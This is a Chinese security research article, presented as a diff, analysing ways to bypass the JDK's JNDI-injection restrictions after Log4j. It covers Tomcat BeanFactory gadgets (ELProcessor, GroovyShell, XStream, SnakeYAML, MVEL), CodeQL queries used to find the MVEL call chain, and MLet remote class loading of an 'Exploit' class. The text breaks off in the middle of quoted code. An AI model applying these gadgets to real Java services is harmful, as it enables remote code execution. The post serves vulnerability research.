@@ -1,0 +1,199 @@
+藏青@雁行安全团队
+最近`Log4j`的漏洞引起了很多师傅对JNDI注入漏洞利用的研究，`浅蓝`师傅的文章[探索高版本 JDK 下
+JNDI漏洞的利用方法](https://tttang.com/archive/1405/)提出了很多关于绕过JNDI高版本限制的方法，本文主要是对文章中的部分方法进行分析并加上一些我个人的思考。
+## 前言
+在分析这些具体的方法前，我们先对绕过的整体思路做一个阐述。目前高版本JDK的防护方式主要是针对加载远程的`ObjectFactory`的加载做限制，只有开启了某些属性后才会通过指定的远程地址获取`ObjectFactory`的Class并实例化，进而通过`ObjectFactory#getObjectInstance`来获取返回的真实对象。但是在加载远程地址获取`ObjectFactory`前，首先在本地`ClassPath`下加载指定的`ObjectFactory`，本地加载`ObjectFactory`失败后才会加载远程地址的`ObjectFactory`，所以一个主要的绕过思路就是加载本地ClassPath下的`ObjectFactory`。
+    static ObjectFactory getObjectFactoryFromReference(
+            Reference ref, String factoryName)
+            throws IllegalAccessException,
+            InstantiationException,
+            MalformedURLException {
+            Class clas = null;
+            // 首先加载当前环境下ClassPath下的ObjectFactory
+            try {
+                 clas = helper.loadClass(factoryName);
+            } catch (ClassNotFoundException e) {
+                // ignore and continue
+                // e.printStackTrace();
+            }
+            // All other exceptions are passed up.
+            // 当前ClassPath加载失败才会加载classFactoryLocation中指定地址的ObjectFactory
+            String codebase;
+            if (clas == null &&
+                    (codebase = ref.getFactoryClassLocation()) != null) {
+                try {
+                    clas = helper.loadClass(factoryName, codebase);
+                } catch (ClassNotFoundException e) {
+                }
+            }
+            return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
+        }
+所以我们需要找到一个`javax.naming.spi.ObjectFactory`接口的实现类，在这个实现类的`getObjectInstance`可以实现一些恶意操作。但是在JDK提供的原生实现类里其实并没有操作空间。所以下面我们主要的思路就是在一些常用的框架或者组件中寻找可利用的ObjectFactory实现类。
+## 常规绕过方式总结
+Tomcat下的绕过比较精彩的并不是EL表达式利用，而是通过`BeanFactory#getObjectInstance`将这个漏洞的利用面从仅仅只能从`ObjectFactory`实现类的`getObjectInstance`方法利用扩展为一次可以调用"任意"类的"任意"方法的机会，但是对调用的类和方法以及参数有些限制。
+  * 该类必须包含public无参构造方法
+  * 调用的方法必须是public方法
+  * 调用的方法只有一个参数并且参数类型为String类型
+所以下面我们只要找到某个类的某个方法既满足了上面的条件又实现我们想要的功能。
+  * `javax.el.ELProcessor#eval`执行命令，但是`ELProcessor`是在Tomcat8才引入的。
+  * `groovy.lang.GroovyShell#evaluate(java.lang.String)`通过Groovy执行命令。
+  * `com.thoughtworks.xstream.XStream().fromXML(String)`通过调用`XStream`转换XML时的反序列化漏洞导致的RCE，这里之所以选择`XStream`是因为Xstream的反序列化漏洞和影响版本比较多。JSON的转换的漏洞相对来说通用性不高。
+  * `org.yaml.snakeyaml.Yaml#load(java.lang.String)`加载Yaml时的反序列化漏洞，在SpringBoot中经常会使用`snakeyaml`来进行yml配置文件的解析。
+  * `org.mvel2.MVEL#eval(String)`执行命令，这里`浅蓝`师傅文章中提到的是`MVEL`类是private所以要找上层调用，我在`2.0.17`中测试`Mvel`是存在public无参构造方法的，高版本确实换成了private构造方法。所以只能找那里调用了`Mvel#eval`方法，而`org.mvel2.sh.ShellSession#exec`调用了`Mvel#eval`，因此可以通过`ShellSession#exec`来间接完成调用。
+  * `com.sun.glass.utils.NativeLibLoader#loadLibrary(String)`加载DLL，前提是我们已经将构造好的DLL上传至目标上，所以局限性比较大。
+## CodeQL分析MVEL调用链挖掘过程
+上面这些利用方法原理理解都比较简单，但是作者怎么找到`org.mvel2.sh.ShellSession#exec`的过程我比较好奇，排除他已知这个方法可以调用外，我们可以思考一下作者如何找到这个方法的。要找到这个方法的思路其实比较简单，可以按照下面的思路。
+  * 除了`org.mvel2.MVEL#eval(String)`可以执行命令其他重载的eval方法也可以执行命令
+  * 查找调用这些eval方法的调用，直到找到一个调用类存在public构造方法且间接调用eval的方法也是public类型并且参数为string类型
+但是如果手动找的话其实比较麻烦，因为调用eval方法的函数其实比较多，如下图所示。
+所以我想用CodeQL来帮我们做这件事情，由于MVEL是github上的开源项目，所以可以直接在[这里](https://lgtm.com/projects/g/mvel/mvel/ci/)下载到数据库。由于eval方法的第一个参数是要执行的表达式，所以我们将这个参数作为sink，source的名称我们不做限制，但是要限制方法的参数为string且只有一个参数，代码如下：
+    /**
+     *@name Tainttrack Context lookup
+     *@kind path-problem
+     */
+    import java
+    import semmle.code.java.dataflow.FlowSources
+    import DataFlow::PathGraph
+    class MVEL extends  RefType{
+        MVEL(){
+            this.hasQualifiedName("org.mvel2", "MVEL")
+        }
+    }
+    //限制参数的类型和数量
+    class CallEval extends  Method {
+        CallEval(){
+            this.getNumberOfParameters() = 1 and this.getParameter(0).getType() instanceof TypeString
+        }
+        Parameter getAnUntrustedParameter() { result = this.getParameter(0) }
+    }
+    //限制方法的名称和类型
+    predicate isEval(Expr arg) {
+        exists(MethodAccess ma |
+            ma.getMethod().getName()="eval"
+            and
+            ma.getMethod().getDeclaringType() instanceof MVEL
+            and
+            arg = ma.getArgument(0)
+        )
+    }
+    class TainttrackLookup  extends TaintTracking::Configuration {
+        TainttrackLookup() { 
+            this = "TainttrackLookup" 
+        }
+        override predicate isSource(DataFlow::Node source) {
+            exists(CallEval evalMethod |
+                source.asParameter() = evalMethod.getAnUntrustedParameter())
+        }
+        override predicate isSink(DataFlow::Node sink) {
+            exists(Expr arg |
+                isEval(arg)
+                and
+                sink.asExpr() = arg
+            )
+        }
+    } 
+    from TainttrackLookup config , DataFlow::PathNode source, DataFlow::PathNode sink
+    where
+        config.hasFlowPath(source, sink)
+    select sink.getNode(), source, sink, "unsafe lookup", source.getNode(), "this is user input"
+但是跑完以后去掉一些看上去有问题的链后并没有找到`浅蓝`师傅发现的那个调用链，只找到了下面的调用链，但是也是在`MVEL`类中的，所以也不能利用。
+下面分析下为什么没跑出来，首先看下我们设置的sink是否有问题，sink确实可以找到`PushContext#execute`方法，所以sink这里没有问题。
+再通过下面的代码检测source是否设置正确，也没有问题，所以说明在污点传播的过程中被打断了。
+经过分析，猜测可能打断污点传播的点有两处。
+  * exec方法直接将参数添加到`inBuffer`中并调用了无参构造方法，如果分析中认为调用无参构造方法就认为污点会被打断那么这里就会导致污点传播被打断
+  * 在`_exec`中通过`arraycopy`完成了`passParameters`的赋值操作，如果CodeQL这里没分析好也会导致污点传播被打断。
+首先分析第一种情况，在`_exec`中将`inBuffer`的值封装为`inTokens`后调用了`containsKey`方法，所以我们在不更改source的情况下将sink更改为对`containsKey`的调用。
+    predicate isEval(Expr arg) {
+        exists(MethodAccess ma |
+            ma.getMethod().getName()="containsKey"
+            and
+            arg = ma.getArgument(0)
+        )
+    }
+可以看到确实是可以从`ShellSession#exec`追踪到`commands.containsKey`中的，所以第一种假设就被推翻了。
+再来看第二种猜测，只要我们编写一个`isAdditionalTaintStep`将arraycopy的第1个参数和`execute`的第2个参数接起来即可。
+    override predicate isAdditionalTaintStep(DataFlow::Node fromNode, DataFlow::Node toNode) {
+            exists(MethodAccess ma,MethodAccess ma2 |
+                ma.getMethod().getDeclaringType().hasQualifiedName("java.lang", "System") 
+                and ma.getMethod().hasName("arraycopy") and fromNode.asExpr()=ma.getArgument(0) 
+                and ma2.getMethod().getDeclaringType().hasQualifiedName("org.mvel2.sh", "Command")  
+                and ma2.getMethod().hasName("execute") and toNode.asExpr()=ma2.getArgument(1)
+             )
+          }
+最终就可以拿到`浅蓝`师傅发现的调用链。
+## MLet利用方式分析
+MLet是UrlClassLoader的子类，因此理论上可以通过loadClass加载远程地址的类进行利用，代码如下：
+    MLet mLet = new MLet();
+    mLet.addURL("http://127.0.0.1:2333/");
+    mLet.loadClass("Exploit");
+### 失败的利用分析
+虽然说loadClass在加载以后没有newInstance不能触发类的初始化操作，但是在BeanFactory中本身就会根据我们传入的名称来实例化对象，如果我们发送两次请求，第一次通过UrlClassLoader加载到内存，由于在loadClass加载的过程中有个缓存机制，如果已经加载过的类会直接返回，我们在第二次请求中直接让实例化这个类不就可以了。
+    protected Class loadClass(String name, boolean resolve)
+            throws ClassNotFoundException
+        {
+            synchronized (getClassLoadingLock(name)) {
+                // First, check if the class has already been loaded
+                Class c = findLoadedClass(name);
+                if (c == null) {
+                    long t0 = System.nanoTime();
+但实际是不行的，因为BeanFactory中获取到类名后是通过`Thread.currentThread().getContextClassLoader()`这个加载器来加载类的，而这个类加载器肯定不是`Mlet`那个加载器，所以它没有加载过我们创建的恶意类，自然也获取不到了。
+    if (obj instanceof ResourceRef) {
+                try {
+                    //从引用对象中获取类名
+                    Reference ref = (Reference)obj;
+                    String beanClassName = ref.getClassName();
+                    Class beanClass = null;
+                    //获取加载器加载类
+                    ClassLoader tcl = Thread.currentThread().getContextClassLoader();
+                    if (tcl != null) {
+                        try {
+                            beanClass = tcl.loadClass(beanClassName);
+                        } catch (ClassNotFoundException var26) {
+                        }
+                    } else {
+                        try {
+                            beanClass = Class.forName(beanClassName);
+                        } catch (ClassNotFoundException var25) {
+                            var25.printStackTrace();
+                        }
+                    }
+### 方法多次调用分析
+那么Mlet为什么可以调用多个方法，因为按照我们前面的分析，只会调用一个方法。下面我们简要分析下`org.apache.naming.factory.BeanFactory#getObjectInstance`。
+  * 从引用对象中获取类名并实例化，这里需要注意的是 **这个类只实例化了一次** 。再从forceString属性中获取内容并通过`,`分割转换为数组，遍历数组中的内容并根据`=`分割获取要调用的方法名获取method对象并保存到Map中。
+    if (obj instanceof ResourceRef) {
+                try {
+                    //从引用对象中获取类名
+                    Reference ref = (Reference)obj;
+                    String beanClassName = ref.getClassName();
+                    Class beanClass = null;
+                    //获取加载器加载类
+                    ClassLoader tcl = Thread.currentThread().getContextClassLoader();
+                    if (tcl != null) {
+                        try {
+                            beanClass = tcl.loadClass(beanClassName);
+                        } catch (ClassNotFoundException var26) {
+                        }
+                    } else {
+                        try {
+                            beanClass = Class.forName(beanClassName);
+                        } catch (ClassNotFoundException var25) {
+                            var25.printStackTrace();
+                        }
+                    }
+                //加载失败抛出异常
+                    if (beanClass == null) {
+                        throw new NamingException("Class not found: " + beanClassName);
+                    } else {
+                        BeanInfo bi = Introspector.getBeanInfo(beanClass);
+                        PropertyDescriptor[] pda = bi.getPropertyDescriptors();
+                        //获取class的对应的对象，只实例化了一次
+                        Object bean = beanClass.getConstructor().newInstance();
+                        //从forceString中获取引用属性
+                        RefAddr ra = ref.get("forceString");
+                        Map forced = new HashMap();
+                        String value;
+                        String propName;
+                        int i;
+                        if (ra != null) {
+                            //获取forceString的内容并通过`,`分割
+                            value = (String)ra.getContent();
